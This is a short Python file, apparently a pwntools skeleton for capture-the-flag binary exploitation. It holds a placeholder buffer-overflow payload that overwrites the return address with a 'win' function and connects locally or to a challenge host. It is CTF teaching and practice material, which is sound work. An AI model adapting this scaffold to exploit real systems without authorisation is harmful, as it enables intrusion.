#!/usr/bin/env python3
"""pwn_template.py — pwntools skeleton for an in-scope pwn challenge.

Copy, fill the three marked spots, run. Local first (process), remote after the
scope check passes. Keeps the boilerplate that is easy to get wrong: ELF/libc
context, tube abstraction, one-shot interaction.

  cp scripts/ctf/templates/pwn_template.py ./exploit.py && $EDITOR exploit.py
"""
from pwn import *  # noqa: F403

BIN = "./chall"          # ← challenge binary
HOST, PORT = "chall.ctf.io", 1337  # ← remote (skip for local)

context.binary = elf = ELF(BIN, checksec=False)
context.log_level = "info"
libc = ELF("./libc.so.6", checksec=False) if os.path.exists("./libc.so.6") else None  # noqa: F405


def start(local: bool = True):
    if local:
        return process(BIN)
    return remote(HOST, PORT)


def exploit(io):
    # 1. leak / parse -------------------------------------------------------
    io.recvuntil(b"> ")
    # 2. build the payload --------------------------------------------------
    payload = b"A" * 40          # ← offset (cyclic -l <crash addr>)
    payload += p64(elf.symbols["win"])  # ← jump target
    # 3. send ---------------------------------------------------------------
    io.sendlineafter(b"data:", payload)
    io.interactive()


if __name__ == "__main__":
    target = start(local="remote" not in sys.argv)  # noqa: F405
    exploit(target)
